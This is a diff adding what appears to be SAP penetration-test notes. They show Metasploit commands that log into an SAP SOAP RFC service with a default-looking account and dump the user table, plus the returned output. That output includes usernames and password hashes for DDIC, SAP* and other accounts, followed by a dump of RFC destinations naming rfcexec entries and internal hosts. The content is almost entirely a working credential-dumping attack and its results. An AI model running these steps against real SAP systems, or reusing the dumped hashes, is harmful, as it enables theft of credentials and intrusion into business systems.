@@ -1,0 +1,74 @@
+
+use auxiliary/scanner/sap/sap_soap_rfc_read_table
+set CLIENT 005
+set HttpPassword ADMIN
+set HttpUsername SAPCPIC
+set RPORT 8000
+set RHOSTS localhost
+set FIELDS MANDT,BNAME,BCODE,USTYP,CLASS,LOCNT,UFLAG,ANAME,PASSCODE,PWDCHGDATE,PWD
+run
+
+Returned Data
+   -------------
+   005|DDIC        |54F9C735|A|SUPER       | 1 | 0 |            |D850998E17B1925F75A9|20160831| 0 | 1 | 1 |{x-issha, 1024}+Asrb7SnpI3droZLdP666fYEkoc/F1g9Irf2FW1xkvw=                                                                                                                                                                                                    |
+   005|SAP*        |C3E73232|S|SUPER       | 0 |64 |            |1D2F369C5504D39B1A19|20160905|254| 1 | 1 |{x-issha, 1024}LOFmZLCJXEBKxg5jXqXwR6c6PQHMzUWjPDRPqsgdGtM=                                                                                                                                                                                                    |
+   005|SAPCPIC     |7D806C24|S|SUPER       | 0 | 0 |SAP*        |38AE55102813F3BBBC3B|20160831|254| 1 | 1 |{x-issha, 1024}FMWBdLp+sq3FMtVPQNYilFoYZdHjapdyQpGmxg90xas=                                                                                                                                                                                                    |
+   005|TMSADM      |0CD1DDFE|C|            | 0 | 0 |DDIC        |D5CD7EE158BE44D0EB04|20160831|254| 1 | 1 |{x-issha, 1024}FTndHTyLFeaS68qvHq6qfdy/33E7wQlF5v4C9hyr1sQ=                                                                                                                                                                                                    |
+
+
+
+set TABLE RFCDES
+set FIELDS RFCDEST,RFCTYPE,RFCOPTIONS
+
+
+[SAP] RFC_READ_TABLE
+====================
+
+   Returned Data
+   -------------
+   .veritest                       |@|
+   BACK                            |I|1=1,
+   CALLTP_Linux                    |T|N=/usr/sap/NPL/DVEBMGS00/exe/tp
+   DOCUMENTATION_HELP              |T|H=%%SAPGUI%%,N=help_04.exe,
+   EU_SCRP_WN32                    |T|H=%%SAPGUI%%,N=gnetx.exe,
+   F1_HELP_SERVER                  |T|H=%%SAPGUI%%,N=$SAPGUI\SAPF1HLP\F1SRV16X.EXE,
+   F1_HELP_SERVER_32               |T|H=%%SAPGUI%%,N=$SAPGUI\SAPF1HLP\F1SRV16X.EXE,
+   F1_HELP_SERVER_40               |T|H=%%SAPGUI%%,N=$SAPGUI\SAPF1H32\F1SRV32X.EXE,
+   GFW_ITS_RFC_DEST                |T|H=%%RFCSERVER%%,N=IGS.ABA,Y=2,h=2,y=-2,z=-2,W=Y,B=N,C=N,E=N,T=N,K=Y,s=N,u=N,q=0,i=N,b=N,k=N,j=N,
+   IGS_RFC_DEST                    |T|H=%%RFCSERVER%%,N=IGS.NPL,Y=2,h=2,y=-2,z=-2,W=Y,B=N,C=N,E=N,T=N,K=Y,s=N,u=N,1=00,q=0,i=N,b=N,k=N,R=N,j=N,
+   LOCAL_EXEC                      |T|H=%%SAPGUI%%,N=rfcexec,
+   LOCAL_EXEX                      |T|H=%%SAPGUI%%,N=/users/ni/rfc/exec,
+   LOCAL_PRINT                     |T|H=%%SAPGUI%%,N=lprint
+   MDX PARSER                      |T|N=mdxsvr,i=Y,
+   NONE                            |I|d=2,1=1,o=00000004,
+   NONE_NU                         |I|d=1,1=1,o=00000004
+   NPL                             |3|
+   NPLCLNT001                      |3|Y=2,h=2,z=-2,W=Y,B=N,C=N,E=N,T=N,K=Y,s=N,u=N,1=00,q=0,i=N,b=N,k=N,d=2,j=N,
+   NPLCLNT007                      |3|H=172.16.13.37,S=00,M=007,U=ZRFC,L=E,Y=2,h=2,z=-2,v=%_PWD,W=Y,B=N,C=N,E=N,T=N,K=Y,s=N,u=N,1=00,q=0,i=N,b=N,k=N,R=N,j=N,
+   R3_WINDOWS_SERVER               |T|H=%%SAPGUI%%,N=wswinsrv.exe,
+   RECORDER                        |X|X=SAPLSREC,l=X,d=2,
+   RECORDER_NU                     |X|X=SAPLSREC,l=X,d=1
+   SAPFORMS                        |T|H=%%SAPGUI%%,N=$SHELL\wdfr3fs.exe,
+   SAPGUI                          |T|l=X
+   SAPGUI_QUEUE                    |X|X=SAPLGRFC,l=X
+   SAPHTTPA                        |T|N=saphttp,
+   SAPIRCONTROLLER                 |T|H=%%SAPGUI%%,N=$SHELL/SAPIRC,
+   SAPIRPCFILETRANSFER             |T|H=%%SAPGUI%%,N=$SHELL/SAPIrFtr,
+   SAPJ2EE                         |T|d=1,o=00000010
+   SAPKPROTP                       |T|N=sapkprotp,o=00000000,
+   SAPOSS                          |3|A=1,a=5,H=/H/147.204.2.5/S/sapdp99/H/oss001,M=001,U=OSS_RFC,L=E,X=LB=ON,I=OSS,N=EWA,Y=2,h=2,z=-2,v=%_PWD,W=Y,B=N,C=N,E=N,T=N,K=Y,s=N,u=N,1=00,q=0,i=N,b=N,k=N,R=N,j=N,
+   SAPSNOTE                        |3|H=/H/sapserv3/H/oss001,M=001,U=OSS_SNOTE,L=E,X=LB=ON,I=OSS,N=1_PUBLIC,Y=2,h=2,z=-2,v=%_PWD,W=Y,B=N,C=N,E=N,T=N,K=Y,s=N,u=N,q=0,i=N,b=N,k=N,R=N,j=N,
+   SAP_SCHEDULE_16                 |T|H=%%SAPGUI%%,N=SAPKALE\SAPKALE.EXE,
+   SAP_SCHEDULE_32                 |T|N=SAPKALE\SCHELAUN.EXE,
+   SAP_SSFATGUI                    |T|H=%%SAPGUI%%,N=$SAPGUI/ssfrfc,
+   SERVER_EXEC                     |T|S=sa,N=rfcexec,
+   SLD_NUC                         |T|H=%%RFCSERVER%%,N=SLD_NUC,G=vhcalnplci,g=sapgw00,
+   SLD_UC                          |T|H=%%RFCSERVER%%,N=SLD_UC,d=2,G=vhcalnplci,g=sapgw00,
+   TMSADM@NPL.DOMAIN_NPL           |3|H=vhcalnplci,S=00,M=000,U=TMSADM,L=E,l=X,Y=2,h=2,z=-2,v=%_PWD,W=Y,B=N,C=N,E=N,T=N,K=Y,s=N,u=N,1=00,q=0,i=N,b=N,k=N,d=2,c=0000,j=N,
+   TMSSUP@NPL.DOMAIN_NPL           |3|H=vhcalnplci,S=00,M=000,U=%_LOG01%,Y=2,h=2,z=-2,W=Y,B=N,C=N,E=N,T=N,K=Y,s=N,u=N,1=00,q=0,i=N,b=Y,k=N,d=2,c=0000,j=N,
+   VFOLDER                         |T|H=%%SAPGUI%%,N=vfolder.exe,
+   saprootme_NPL_00                |I|H=saprootme,S=00,d=2,
+   sapweb_NPL_00                   |I|H=sapweb,S=00,d=2,
+   vhcalabaci_ABA_00               |I|H=vhcalabaci,S=00,d=2,
+   vhcalnplci_NPL_00               |I|H=vhcalnplci,S=00,d=2,
+   wdflbmd16187_ABA_00             |I|H=wdflbmd16187,S=00,d=2,
